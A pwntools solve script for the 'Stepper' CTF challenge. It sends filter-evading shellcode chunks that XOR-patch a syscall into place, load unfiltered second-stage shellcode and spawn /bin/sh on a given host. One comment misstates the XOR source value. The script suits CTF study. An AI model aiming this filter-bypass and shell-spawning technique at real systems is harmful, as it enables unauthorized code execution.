#!/usr/bin/env python3
"""Stepper - Pwn (Hard): the guest page is RWX and 0xf4-filled; 6-byte chunks pass a
filter that forbids 0f 05 34 cd. Synthesize a syscall at runtime with an XOR patch,
re-enter read() to drop unrestricted shellcode, and execve("/bin/sh", 0, 0).

Usage: python3 stepper.py <host> <port>     (remote)
       python3 stepper.py local [./stepper] (local binary)

The CSCTF 2026 instance is retired; this PoC documents the exploit path.
"""
import sys
from pwn import *

context.arch = "amd64"

# Step chunks (length-prefixed by the program). None contain the forbidden bytes.
STEPS = [
    b"\xe8\x00\x00\x00\x00\x58",  # call $+5 ; pop rax   -> rax = code+5
    b"\x48\x8d\x58\x1b",          # lea rbx, [rax+0x1b]  -> code+0x20 (scratch dword)
    b"\x48\x8d\x70\x3b",          # lea rsi, [rax+0x3b]  -> code+0x40 (2nd-stage buffer)
    b"\x31\xc0",                  # xor eax, eax         -> eax = 0 (SYS_read)
    b"\xba\x00\x04\x00\x00",      # mov edx, 0x400
    b"\x81\x33\xfb\xf1\x0b\x12",  # xor dword [rbx], 0x120bf1fb
                                 #   0xfffffffb ^ 0x120bf1fb = 0f 05 ff e6
                                 #   (hlt hlt hlt hlt) -> syscall ; jmp rsi
    b"\xff\xe3",                  # jmp rbx (then shellcode queued on stdin)
]
FORBIDDEN = (0x0F, 0x05, 0x34, 0xCD)


def main():
    for step in STEPS:
        assert not any(b in FORBIDDEN for b in step), "byte filter would reject chunk"

    if len(sys.argv) >= 2 and sys.argv[1] == "local":
        binary = sys.argv[2] if len(sys.argv) > 2 else "./stepper"
        p = process(binary)
    elif len(sys.argv) >= 2:
        host, _, port = sys.argv[1].partition(":")
        p = remote(host, int(port))
    else:
        raise SystemExit(__doc__)

    second_stage = asm(shellcraft.execve("/bin/sh", 0, 0))

    for i, step in enumerate(STEPS):
        # read_num uses strtol: length line must be digits + '\n'
        p.sendline(str(len(step)).encode())
        p.send(step)
        if i == len(STEPS) - 1:
            # The guest's read(0, code+0x40, 0x400) is already queued; this stage is
            # never inspected by the byte filter.
            p.send(second_stage)

    # The guest's queued read may slurp up to 0x400 bytes; leave stdin to the shell.
    p.interactive()


if __name__ == "__main__":
    main()
